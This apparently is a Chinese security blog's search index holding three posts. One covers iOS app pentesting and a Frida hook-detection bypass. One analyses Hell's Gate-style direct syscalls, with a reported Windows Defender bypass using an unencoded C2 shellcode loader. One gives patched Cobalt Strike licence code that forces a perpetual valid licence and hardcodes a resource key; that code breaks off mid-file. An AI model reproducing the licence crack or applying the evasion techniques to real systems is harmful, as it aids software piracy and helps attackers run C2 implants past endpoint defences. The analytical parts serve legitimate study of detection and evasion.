<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>IOS端渗透测试从0到1</title>
    <link href="/2021/12/22/IOS%E7%AB%AF%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BB%8E0%E5%88%B01/"/>
    <url>/2021/12/22/IOS%E7%AB%AF%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BB%8E0%E5%88%B01/</url>
    
    <content type="html"><![CDATA[<p>这篇文章记录下此次APP渗透测试过程，包括从0搭建渗透测试环境，程序hook检测绕过，绕过原理。</p><h2 id="渗透测试环境搭建"><a href="#渗透测试环境搭建" class="headerlink" title="渗透测试环境搭建"></a>渗透测试环境搭建</h2><h3 id="越狱"><a href="#越狱" class="headerlink" title="越狱"></a>越狱</h3><h4 id="工具环境"><a href="#工具环境" class="headerlink" title="工具环境"></a>工具环境</h4><ul><li><p>IPhone 7，固件版本为12.4.1</p></li><li><p>爱思助手7.0官方最新版本</p></li></ul><h4 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h4><p>在进行越狱前，请先确保设备上的重要数据已经备份，比如通讯录等，因为越狱过程无法保证不出现问题，而一旦出现意外设备上的重要数据可能会丢失。</p><p>首先连接手机到PC电脑，在手机上弹出的允许设备访问中选择允许访问。</p><p>第二步，在爱思助手中选择一键越狱工具。工具箱–&gt;一键越狱。</p><p><img src="/images/ios_pentest_0_1/%E4%B8%80%E9%94%AE%E8%B6%8A%E7%8B%B1.png" alt="工具箱--&gt;一键越狱"></p><p><img src="/images/ios_pentest_0_1/%E8%B6%8A%E7%8B%B1%E5%B7%A5%E5%85%B7%E9%80%89%E9%A1%B9.png" alt="越狱工具选项"></p><p>第三步，根据设备的固件版本选择越狱工具，推荐使用第一种越狱方法（unc0ver），笔者在测试过程当中就是用的这种方法，其余两种方法在测试过程中都没有成功，可能跟固件版本有关。</p><p>第四步，选择越狱方法，点击开始越狱按钮进行越狱工具安装，这一过程会自动在iphone设备上安装unc0ver app。由于app的设备证书是自签名证书，所以在app安装完成后需要在设备管理当中信任该证书才能继续后面的操作。</p><p><img src="/images/ios_pentest_0_1/%E5%BC%80%E5%A7%8B%E8%B6%8A%E7%8B%B1.png" alt="开始越狱"></p><p>第五步，app安装完成并信任证书后，进入app页面，点击JailBreak进行越狱（这里由于笔者是已经越狱的设备，所以这里显示是Re-JailBreak）。正常越狱的过程应该是很顺滑的，如果在越狱过程当中出现越狱失败的提示，可以在爱思助手上选择安装不同版本的unc0ver app进行尝试，笔者在测试过程当中，最新版本无法完成设备的越狱，选择低版本的app后，越狱成功。</p><p><img src="/images/ios_pentest_0_1/%E5%AE%89%E8%A3%85%E6%88%90%E5%8A%9F.png" alt="安装成功"></p><p><img src="/images/ios_pentest_0_1/unc0ver%E7%89%88%E6%9C%AC%E9%80%89%E6%8B%A9%E4%BF%A1%E6%81%AF.png" alt="unc0ver版本选择信息"></p><p>第六步，越狱成功后，设备中会出现Cydia这个应用程序。通过Cydia可以安装第三方的app，这里笔者先安装最新版的frida server端到设备上。在cydia中添加frida源 <a href="https://build.frida.re,点击添加源进行添加./">https://build.frida.re，点击添加源进行添加。</a></p><p><img src="/images/ios_pentest_0_1/Cydia%E6%B7%BB%E5%8A%A0frida%E6%BA%90.png" alt="Cydia添加frida源"></p><p>添加完成后，在软件页面搜索frida进行安装。</p><p><img src="/images/ios_pentest_0_1/frida%E5%AE%89%E8%A3%85.png" alt="frida安装"></p><p>第七步，为了方便以后对iphone设备的管理过程，笔者通过Cydia安装了OpenSSH，安装完成后，会自动启动，并且可通过root/mobile和默认密码alpine登录。注意，安装完成后，修改root用户和mobile用户的默认密码。</p><p><img src="/images/ios_pentest_0_1/ssh%E6%90%9C%E7%B4%A2%E7%BB%93%E6%9E%9C.png" alt="ssh搜索结果"></p><p><img src="/images/ios_pentest_0_1/ssh%E7%99%BB%E5%BD%95%E5%B9%B6%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81.png" alt="ssh登录并修改密码"></p><p>第八步，验证Frida安装情况。frida安装完成后，会自动启动。验证是否安装成功，在命令行输入frida-ps -U，查看进程输出信息。</p><p><img src="/images/ios_pentest_0_1/frida%E9%AA%8C%E8%AF%81%E6%83%85%E5%86%B5.png" alt="frida验证情况"></p><p>出现上图类似的信息，证明安装成功，可以进行hook操作了。</p><h2 id="实战APP流量解密"><a href="#实战APP流量解密" class="headerlink" title="实战APP流量解密"></a>实战APP流量解密</h2><p>笔者这次需要测试的APP为一款采用了mpaas sdk加密的应用。在github搜索了相关的解密工具之后，笔者发现一款<a href="https://github.com/cnmsec/MpaasPentestTool">MpaasPentestTool</a>，正好满足笔者需求（便捷的查看和修改请求包、返回包）。然而，当笔者使用该工具注入app进程后，进程会一段时间后结束运行退出。在经过一番实验之后，笔者确定app在检测到自身OC代码被hook之后，将会自动退出。</p><p><img src="/images/ios_pentest_0_1/%E4%BD%BF%E7%94%A8frida-hook%E4%BC%9A%E8%A2%AB%E6%A3%80%E6%B5%8B%E5%88%B0.png" alt="使用frida-hook会被检测到"></p><p>请注意笔者这里的描述，是检测到自身OC代码被hook。这是因为笔者在尝试hook native库和系统OC库之后，程序并没有检测到，也没有退出。</p><p><img src="/images/ios_pentest_0_1/hook_libsystem_c%E5%BA%93.png" alt="hook_libsystem_c库"></p><p><img src="/images/ios_pentest_0_1/frida_hook_%E7%B3%BB%E7%BB%9Foc%E5%BA%93.png" alt="frida_hook_系统oc库"></p><p>此时笔者大胆猜测，该APP只会检测自身OC代码是否被hook，自身native代码的检测情况这里先不管，因为跑MpaasPentestTool这个工具仅仅需要我们hook OC代码即可。接下来就是想尽办法进行绕过检测了，由于笔者IOS逆向水平处于入门水平，没有用IDA去看脱壳后的程序，分析哪里对frida hook进行了检测，这里笔者从frida hook代码编写上入手，看看能否从hook的地方绕过。</p><p>在google搜索和仔细查看了Frida官方的API文档后，笔者发现对OC代码进行hook有两者方式可以实现，一种是MpaasPentestTool采用的基于事件的方式，另一种是对函数直接进行替换。</p><p><img src="/images/ios_pentest_0_1/%E5%87%BD%E6%95%B0%E6%9B%BF%E6%8D%A2%E5%BD%A2%E5%BC%8FHook.png" alt="函数替换形式Hook"></p><p><img src="/images/ios_pentest_0_1/%E5%9F%BA%E4%BA%8E%E4%BA%8B%E4%BB%B6%E9%80%9A%E7%9F%A5%E7%9A%84hook%E5%BD%A2%E5%BC%8F.png" alt="基于事件通知的hook形式"></p><p>在发现另一种hook方式之后，笔者将MpaasPentestTool原本的hook方式改为对函数直接进行替换的方式。结果出乎意料的是，竟然直接绕过了app对hook的检测。最终实现了MpaasPentestTool作者给出的效果。</p><p><img src="/images/ios_pentest_0_1/%E6%9C%80%E7%BB%88%E6%95%88%E6%9E%9C1.png" alt="最终效果1"></p><p><img src="/images/ios_pentest_0_1/%E6%9C%80%E7%BB%88%E6%95%88%E6%9E%9C2.png" alt="最终效果2"></p><h2 id="绕过原理分析"><a href="#绕过原理分析" class="headerlink" title="绕过原理分析"></a>绕过原理分析</h2><p>app检测frida hook的原理其实是从Hook技术本身出发，检测hook的特征。通过Google学习，笔者了解到OC存在三种HOOK方式，分别是objc_msgSend、inline hook、imp替换hook。笔者分别查看这两种方式Hook前后，imp指针和函数头部指令的变化，确定这两种方式分别是哪种hook技术。</p><p><img src="/images/ios_pentest_0_1/implementation%E5%AE%9E%E7%8E%B0%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90.png" alt="implementation实现技术分析"></p><p><img src="/images/ios_pentest_0_1/attach%E5%AE%9E%E7%8E%B0%E5%88%86%E6%9E%90.png" alt="attach实现分析"></p><p><img src="/images/ios_pentest_0_1/%E5%A4%B4%E9%83%A8%E6%8C%87%E4%BB%A4%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF%E6%9F%A5%E7%9C%8B%E4%BB%A3%E7%A0%81.png" alt="头部指令详细信息查看代码"></p><p>分别进行注入，查看输出，最后一窥究竟。</p><p>Attach实现方式其实是Inline Hook。</p><p><img src="/images/ios_pentest_0_1/attach%E5%AE%9E%E7%8E%B0%E5%85%B6%E5%AE%9E%E6%98%AFinline_hook.png" alt="attach实现其实是inline_hook"></p><p><img src="/images/ios_pentest_0_1/attach%E5%AE%9E%E7%8E%B0%E5%85%B6%E5%AE%9E%E6%98%AFinline_hook2.png" alt="attach实现其实是inline_hook2"></p><p>Implement实现方式是替换IMP指针。</p><p><img src="/images/ios_pentest_0_1/Implement%E5%AE%9E%E7%8E%B0%E6%98%AF%E6%9B%BF%E6%8D%A2IMP%E6%8C%87%E9%92%88.png" alt="Implement实现是替换IMP指针"></p><p>通过分析Hook技术的实现不同，可以大胆猜测，app检测自身是否被hook采用了检测imp指针指向函数的头部指令是否是ldr + br跳转，如果是则认为自身代码被hook，那么将会直接退出程序自身。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://zhuanlan.zhihu.com/p/167924620">为什么使用汇编可以 Hook objc_msgSend（下）- 实现与分析</a></li><li><a href="https://zhuanlan.zhihu.com/p/130680057">为什么使用汇编可以 Hook objc_msgSend（上）- 汇编基础</a></li><li><a href="https://blog.csdn.net/yiyaaixuexi/article/details/9374411">Objective-C的hook方案（一）: Method Swizzling</a></li><li><a href="https://www.cnblogs.com/HugJun/p/14735373.html">iOS hook</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>逆向</tag>
      
      <tag>IOS安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hell&#39;s Gate技术</title>
    <link href="/2021/12/03/Hell-s-Gate%E6%8A%80%E6%9C%AF/"/>
    <url>/2021/12/03/Hell-s-Gate%E6%8A%80%E6%9C%AF/</url>
    
    <content type="html"><![CDATA[<h2 id="EDR检测与绕过原理"><a href="#EDR检测与绕过原理" class="headerlink" title="EDR检测与绕过原理"></a>EDR检测与绕过原理</h2><p>在创建R3进程的时候，EDR会hook用户层的相关windows API调用，从而完成对进程动态行为的监控。比如，hook VirtualAlloc，监控内存分配。hook CreateProcess，监控进程创建。可以在用户层完成hook，也可以在内核层hook。用户层hook的好处是对性能的影响较小，相对于内核层hook更稳定，不容易导致系统蓝屏，所以很多EDR会选择在用户层hook，同时在内核层使用回调监控重要的内核api调用。一个进程分配了RWX属性的内存，或者修改了内存属性，将RW的内存修改为了RWX，由于RWX内存属性是shellcode或反射型DLL加载所用的内存属性，因此EDR会对申请的内存进行扫描，匹配到恶意软件的yara规则后，将会杀死恶意进程，并向控制中心发送告警。为了避免在用户层被EDR hook的敏感函数检测到敏感行为，利用从ntdll中读取到的系统调用号进行系统直接调用来绕过敏感API函数的hook。</p><h2 id="SysWhispers2"><a href="#SysWhispers2" class="headerlink" title="SysWhispers2"></a>SysWhispers2</h2><p>国外的师傅开源一个仓库<a href="https://github.com/jthuraisamy/SysWhispers2">SysWhispers2</a>，代码原理是从内存当中的ntdll中根据导出函数的地址顺序，确定系统调用号。SysWhispers2的优点是对于开发者而言，只需要正常调用Nt*系列函数即可，封装比较便捷，缺点也很明显，会增加代码所占用空间。</p><p><img src="/images/syscall/%E4%BB%8E%E5%B7%B2%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%86%85%E5%AD%98%E6%A8%A1%E5%9D%97%E5%BD%93%E4%B8%AD%E6%89%BE%E5%88%B0ntdll.png" alt="从已加载的内存模块当中找到ntdll"></p><p>首先程序需要调用SW2_PopulateSyscallList从内存当中搜索NTDLL内存模块，需要注意的是，这里作者是通过名称比较来判断的。</p><p><img src="/images/syscall/%E9%81%8D%E5%8E%86%E5%AF%BC%E5%87%BA%E8%A1%A8%E8%8E%B7%E5%BE%97%E5%AF%BC%E5%87%BA%E7%9A%84Zw%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80.png" alt="遍历导出表获得导出的Zw函数地址"></p><p>找到这个ntdll模块之后，遍历导出函数表确定导出的Zw的函数地址，并保存到全局syscall表中。</p><p><img src="/images/syscall/%E5%80%92%E5%BA%8F%E6%8E%92%E5%BA%8F%E5%AD%98%E5%82%A8.png" alt="倒序排序存储"></p><p>对函数地址倒序排序存储，系统调用ENTRY的数组下标即为系统调用号。</p><p><img src="/images/syscall/syscall%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B1.png" alt="syscall调用1"></p><p><img src="/images/syscall/syscall%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B2.png" alt="syscall调用2"></p><p>这之后就可以像调用正常的Nt*函数一样直接走syscall调用，syscall的调用号通过预先定义的HASH值从存储的函数数组中搜索，比较相等的函数HASH的下标即为调用号。</p><h2 id="Hell’s-Gate"><a href="#Hell’s-Gate" class="headerlink" title="Hell’s Gate"></a>Hell’s Gate</h2><p><a href="https://vxug.fakedoma.in/papers/VXUG/Exclusive/HellsGate.pdf">Hell’s Gate</a>方式是另一种syscall动态调用方案，其原理是从内存中已经加载的ntdll.dll模块中通过解析导出表，定位函数地址，再通过特征码获取系统调用号，这种方式的好处是可以准确的获取系统调用号，缺点是需要一个干净的内存ntdll模块，否则将无法完成syscall调用号的获取（遇到hook ntdll系统调用的EDR就不行了）。</p><p><img src="/images/syscall/Hell_Gate_1.png" alt="Hell‘s Gate入口分析1"></p><p><img src="/images/syscall/Hell_Gate_2.png" alt="Hell‘s Gate入口分析2"></p><p>首先获取进程PEB信息，并判断系统版本，如果不是windows 10，则直接退出程序。</p><p><img src="/images/syscall/Hell_Gate_3.png" alt="Hell‘s Gate入口分析3"></p><p><img src="/images/syscall/Hell_Gate_4.png" alt="Hell‘s Gate入口分析4"></p><p>获取导出表信息，如果没有找到导出表，则直接退出。</p><p><img src="/images/syscall/Hell_Gate_5.png" alt="Hell‘s Gate入口分析5"></p><p><img src="/images/syscall/Hell_Gate_6.png" alt="Hell‘s Gate入口分析6"></p><p>通过遍历导出表，找到与函数HASH相同的地址信息，然后简单粗暴的比较几个字节，判断函数是否被HOOK，如果被HOOK就直接返回FALSE。</p><p><img src="/images/syscall/Hell_Gate_7.png" alt="Hell‘s Gate入口分析7"></p><p><img src="/images/syscall/Hell_Gate_8.png" alt="Hell‘s Gate入口分析8"></p><p>最后通过传入函数获取到的系统调用号，执行payload，完成direct syscall调用。</p><h2 id="Halo’s-Gate"><a href="#Halo’s-Gate" class="headerlink" title="Halo’s Gate"></a>Halo’s Gate</h2><p><a href="https://blog.sektor7.net/#!res/2021/halosgate.md">Halo’s Gate</a>是对Hell’s Gate的增强。Halo’s Gate的原理是EDR不可能HOOK全部的Nt*函数，总有一些不敏感的函数没有被HOOK，程序当中以STUB_SIZE(这个长度为32)上下循环遍历，找到没有被HOOK的STUB后获取其系统调用号再减去移动的步数，就是所要搜索的系统调用号。这种方式的优点是可以避免所要搜索的函数被hook之后，程序直接返回。</p><p><img src="/images/syscall/Halo_Gate_1.png" alt="Halo&#39;s Gate分析1"></p><h2 id="Tartarus’-Gate"><a href="#Tartarus’-Gate" class="headerlink" title="Tartarus’ Gate"></a>Tartarus’ Gate</h2><p><a href="https://trickster0.github.io/posts/Halo's-Gate-Evolves-to-Tartarus-Gate/">Tartarus’ Gate</a>其作者声称是对Halo’s Gate的增强，然而当读完代码之后，笔者觉得新增的check没有意义。</p><p><img src="/images/syscall/Halo_Gate_2.png" alt="Tartarus&#39;s Gate分析"></p><p>比较第一个字节和第四个是否是0xe9(jmp指令)，来判断是否被hook，这种例外已经被特征码匹配所包含，所以笔者觉得新增的代码判断没有意义。</p><h2 id="另一种获取干净的ntdll的方式"><a href="#另一种获取干净的ntdll的方式" class="headerlink" title="另一种获取干净的ntdll的方式"></a>另一种获取干净的ntdll的方式</h2><p>这一点已经被EDR作为异常行为监控的特点之一，可以参看<a href="https://www.cyberbit.com/blog/endpoint-security/malware-mitigation-when-direct-system-calls-are-used/">检测使用syscall的恶意软件tips</a>。原理是从系统磁盘读取一份ntdll（x86进程是C:\Windows\SysWow64\ntdll.dll，x64进程是C:\Windows\Systen32\ntdll.dll）的数据到内存，通过原始文件中的导出表数据获取没有被hook的Nt函数，进而获得系统调用号。github上有利用这一技术的poc实现，<a href="https://github.com/N4kedTurtle/HellsGatePoC">HellsGatePoc</a>。</p><p><img src="/images/syscall/HellsGatePoc.png" alt="HellsGatePoc"></p><h2 id="测试bypass效果"><a href="#测试bypass效果" class="headerlink" title="测试bypass效果"></a>测试bypass效果</h2><p>笔者这里以64位加载器为例，测试windows defender bypass效果。</p><p><img src="/images/syscall/shellcode%E5%92%8C%E5%8A%A0%E8%BD%BD%E5%99%A8.png" alt="shellcode填充"></p><p>使用shellcode生成框架生成上线的shellcode，转换为C语言数组格式，利用syscall编写的加载器执行上线，shellcode未经过编码加密。</p><p><img src="/images/syscall/windows_defender%E8%BF%90%E8%A1%8C%E7%8A%B6%E6%80%81.png" alt="windows defender运行状态"></p><p><img src="/images/syscall/windows_defender%E6%8E%92%E9%99%A4%E6%96%87%E4%BB%B6%E5%A4%B9.png" alt="windows defender排除文件夹"></p><p>windows defender保护状态为全开，桌面文件夹也没在排除项中。</p><p><img src="/images/syscall/defender_bypass.png" alt="bypass defender"></p><p>绕过defender查杀上线成功，其他杀软请自行进行修改测试，这里只是验证syscall绕过查杀的效果。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li><a href="https://processhacker.sourceforge.io/">processhacker 2.39</a></li><li><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite">Sysinternals Suite</a></li><li><a href="https://github.com/jthuraisamy/SysWhispers2">SysWhispers2</a></li><li><a href="https://teamhydra.blog/2020/09/18/implementing-direct-syscalls-using-hells-gate/">implementing-direct-syscalls-using-hells-gate</a></li><li><a href="https://vxug.fakedoma.in/papers/VXUG/Exclusive/HellsGate.pdf">Hell’s Gate</a></li><li><a href="https://www.cyberbit.com/blog/endpoint-security/malware-mitigation-when-direct-system-calls-are-used/">检测使用syscall的恶意软件tips</a></li><li><a href="https://blog.sektor7.net/#!res/2021/halosgate.md">Halo’s Gate</a></li><li><a href="https://trickster0.github.io/posts/Halo's-Gate-Evolves-to-Tartarus-Gate/">Tartarus’ Gate</a></li><li><a href="https://github.com/mai1zhi2/SysWhispers2_x86">SysWhispers2_x86</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>anti-bypass</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CS二开相关</title>
    <link href="/2021/12/02/CS%E4%BA%8C%E5%BC%80%E7%9B%B8%E5%85%B3/"/>
    <url>/2021/12/02/CS%E4%BA%8C%E5%BC%80%E7%9B%B8%E5%85%B3/</url>
    
    <content type="html"><![CDATA[<p>计算HASH，使用windows命令行</p><figure class="highlight powershell"><table><tr><td class="gutter hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">certutil <span class="hljs-literal">-hashfile</span> cobaltstrike.jar SHA256<br></code></pre></div></td></tr></table></figure><p>验证HASH官方地址</p><figure class="highlight powershell"><table><tr><td class="gutter hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">https://verify.cobaltstrike.com/<br></code></pre></div></td></tr></table></figure><p>CS 4.3相关</p><figure class="highlight java"><table><tr><td class="gutter hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> common;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Authorization</span> </span>&#123;<br>   <span class="hljs-keyword">protected</span> <span class="hljs-keyword">int</span> watermark = <span class="hljs-number">0</span>;<br>   <span class="hljs-keyword">protected</span> String validto = <span class="hljs-string">&quot;&quot;</span>;<br>   <span class="hljs-keyword">protected</span> String error = <span class="hljs-keyword">null</span>;<br>   <span class="hljs-keyword">protected</span> <span class="hljs-keyword">boolean</span> valid = <span class="hljs-keyword">false</span>;<br><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Authorization</span><span class="hljs-params">()</span> </span>&#123;<br>      <span class="hljs-keyword">this</span>.watermark = ; <span class="hljs-comment">// 这里定义成字节的水印</span><br>      <span class="hljs-keyword">this</span>.validto = <span class="hljs-string">&quot;forever&quot;</span>;<br>      <span class="hljs-keyword">this</span>.error = <span class="hljs-keyword">null</span>;<br>      <span class="hljs-keyword">this</span>.valid = <span class="hljs-keyword">true</span>;<br>      <span class="hljs-keyword">try</span> &#123;<br>         MudgeSanity.systemDetail(<span class="hljs-string">&quot;valid to&quot;</span>, <span class="hljs-string">&quot;perpetual&quot;</span>);<br>         MudgeSanity.systemDetail(<span class="hljs-string">&quot;id&quot;</span>, getWatermark());<br>         SleevedResource.Setup(hex2bytes(<span class="hljs-string">&quot;3a4425490f389aeec312bdd758ad2b99&quot;</span>));<br>      &#125;<span class="hljs-keyword">catch</span> (Exception ex2) &#123;<br>         MudgeSanity.logException(<span class="hljs-string">&quot;auth file parsing&quot;</span>, ex2, <span class="hljs-keyword">false</span>);<br>      &#125;<br>   &#125;<br><br>   <span class="hljs-keyword">private</span> <span class="hljs-keyword">byte</span>[] hex2bytes(String s) &#123;<br>      <span class="hljs-keyword">int</span> len = s.length();<br>      <span class="hljs-keyword">byte</span>[] data = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[len / <span class="hljs-number">2</span>];<br>      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i += <span class="hljs-number">2</span>) &#123;<br>         data[i / <span class="hljs-number">2</span>] = (<span class="hljs-keyword">byte</span>) ((Character.digit(s.charAt(i), <span class="hljs-number">16</span>) &lt;&lt; <span class="hljs-number">4</span>) + Character.digit(s.charAt(i+<span class="hljs-number">1</span>), <span class="hljs-number">16</span>));<br>      &#125;<br>      <span class="hljs-keyword">return</span> data;<br>   &#125;<br><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isPerpetual</span><span class="hljs-params">()</span> </span>&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;forever&quot;</span>.equals(<span class="hljs-keyword">this</span>.validto);<br>   &#125;<br><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isValid</span><span class="hljs-params">()</span> </span>&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.valid;<br>   &#125;<br><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getError</span><span class="hljs-params">()</span> </span>&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.error;<br>   &#125;<br><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getWatermark</span><span class="hljs-params">()</span> </span>&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.watermark + <span class="hljs-string">&quot;&quot;</span>;<br>   &#125;<br><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">long</span> <span class="hljs-title">getExpirationDate</span><span class="hljs-params">()</span> </span>&#123;<br>      <span class="hljs-keyword">return</span> CommonUtils.parseDate(<span class="hljs-keyword">this</span>.validto, <span class="hljs-string">&quot;yyyyMMdd&quot;</span>);<br>   &#125;<br><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isExpired</span><span class="hljs-params">()</span> </span>&#123;<br>      <span class="hljs-keyword">return</span> System.currentTimeMillis() &gt; <span class="hljs-keyword">this</span>.getExpirationDate() + CommonUtils.days(<span class="hljs-number">1</span>);<br>   &#125;<br><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">whenExpires</span><span class="hljs-params">()</span> </span>&#123;<br>      <span class="hljs-keyword">long</span> var1 = (<span class="hljs-keyword">this</span>.getExpirationDate() + CommonUtils.days(<span class="hljs-number">1</span>) - System.currentTimeMillis()) / CommonUtils.days(<span class="hljs-number">1</span>);<br>      <span class="hljs-keyword">if</span> (var1 == <span class="hljs-number">1L</span>) &#123;<br>         <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;1 day (&quot;</span> + CommonUtils.formatDateAny(<span class="hljs-string">&quot;MMMMM d, YYYY&quot;</span>, <span class="hljs-keyword">this</span>.getExpirationDate()) + <span class="hljs-string">&quot;)&quot;</span>;<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>         <span class="hljs-keyword">return</span> var1 &lt;= <span class="hljs-number">0L</span> ? <span class="hljs-string">&quot;TODAY (&quot;</span> + CommonUtils.formatDateAny(<span class="hljs-string">&quot;MMMMM d, YYYY&quot;</span>, <span class="hljs-keyword">this</span>.getExpirationDate()) + <span class="hljs-string">&quot;)&quot;</span> : var1 + <span class="hljs-string">&quot; days (&quot;</span> + CommonUtils.formatDateAny(<span class="hljs-string">&quot;MMMMM d, YYYY&quot;</span>, <span class="hljs-keyword">this</span>.getExpirationDate()) + <span class="hljs-string">&quot;)&quot;</span>;<br>      &#125;<br>   &#125;<br><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isAlmostExpired</span><span class="hljs-params">()</span> </span>&#123;<br>      <span class="hljs-keyword">long</span> var1 = System.currentTimeMillis() + CommonUtils.days(<span class="hljs-number">30</span>);<br>      <span class="hljs-keyword">return</span> var1 &gt; <span class="hljs-keyword">this</span>.getExpirationDate();<br>   